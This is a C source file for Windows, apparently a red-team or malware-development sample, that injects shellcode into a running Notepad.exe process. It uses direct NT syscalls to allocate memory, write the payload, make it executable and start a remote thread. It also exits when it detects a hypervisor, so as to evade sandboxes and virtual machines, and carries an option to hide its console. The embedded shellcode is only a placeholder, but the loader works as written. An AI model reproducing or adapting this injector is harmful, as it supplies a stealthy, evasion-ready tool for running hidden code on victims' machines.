#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include "syscall.h"
#include "function signature.h"
#pragma comment (lib, "advapi32")
#pragma section(".text")
/*
programmer : binophism
github page: https://github.com/binophism
*/
_declspec(allocate(".text"))UCHAR ShellCode[] = "\x90\x90\x90\xcc\xcc\xcc\xc3";
SIZE_T ShellCodeSize= _countof(ShellCode);

int main(){
	if (cpuid_hypervisor_vendor()) {
		exit(FALSE);
	}
	//FreeConsole(); // -> Hide Console 

	int pid = FindProcess(L"Notepad.exe");
	if (pid == 0) {
		perror("[Error] Process NotFound");
		return EXIT_FAILURE;
	}
	CLIENT_ID CLID = {NULL};
	OBJECT_ATTRIBUTES obj_attr;
	HANDLE hProc = NULL;
	InitializeObjectAttributes(&obj_attr, NULL, NULL, NULL, NULL);
	CLID.UniqueProcess = (HANDLE)pid;
	CLID.UniqueThread = (HANDLE)0;
	__try {
		NtOpenProcess(&hProc, MAXIMUM_ALLOWED, &obj_attr, &CLID);
		LPVOID alloc_shellcode = NULL;
		NtAllocateVirtualMemory(hProc, &alloc_shellcode, NULL, &ShellCodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		NtWriteVirtualMemory(hProc, alloc_shellcode, ShellCode, ShellCodeSize, NULL);
		DWORD old = NULL;
		NtProtectVirtualMemory(hProc, &alloc_shellcode, &ShellCodeSize, PAGE_EXECUTE_READ, &old);
		HANDLE hThread = 0;
		NtCreateThreadEx(&hThread, 0x1FFFFF, NULL, hProc, alloc_shellcode, NULL, NULL,NULL,NULL,NULL,NULL);
		if (hThread) {
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
		}
	}__except (EXCEPTION_ACCESS_VIOLATION | EXCEPTION_EXECUTE_HANDLER) {
		printf("[ERROR] %u\n", GetLastError());
	}
	return EXIT_SUCCESS;
}


